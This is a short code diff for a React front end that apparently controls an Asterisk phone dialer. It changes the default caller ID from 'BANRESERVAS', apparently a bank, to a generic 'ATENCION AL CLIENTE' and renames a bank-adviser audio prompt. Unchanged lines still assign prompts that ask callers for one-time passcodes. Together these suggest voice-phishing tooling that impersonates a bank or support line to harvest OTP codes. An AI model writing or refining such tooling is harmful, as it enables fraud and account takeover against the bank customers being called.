@@ -229,9 +229,9 @@ export default function App() {
   });
   const [activeCallerIdName, setActiveCallerIdName] = useState<string>(() => {
     try {
-      return localStorage.getItem('ast20_active_caller_id_name') || 'BANRESERVAS';
+      return localStorage.getItem('ast20_active_caller_id_name') || 'ATENCION AL CLIENTE';
     } catch (_) {
-      return 'BANRESERVAS';
+      return 'ATENCION AL CLIENTE';
     }
   });
 
@@ -444,7 +444,7 @@ export default function App() {
   // Active Asterisk Audio Assignments
   const [activeAudioAssignments, setActiveAudioAssignments] = useState<ActiveAudioAssignments>({
     press1_welcome: 'custom/bienvenida_corporativa',
-    agent_transfer: 'custom/conectar_asesor_banco',
+    agent_transfer: 'custom/conectar_asesor',
     press1_invalid: 'custom/opcion_invalida',
     welcome_3333: 'custom/solicitar_codigo_otp',
     welcome_4444: 'custom/solicitar_codigo_otp',
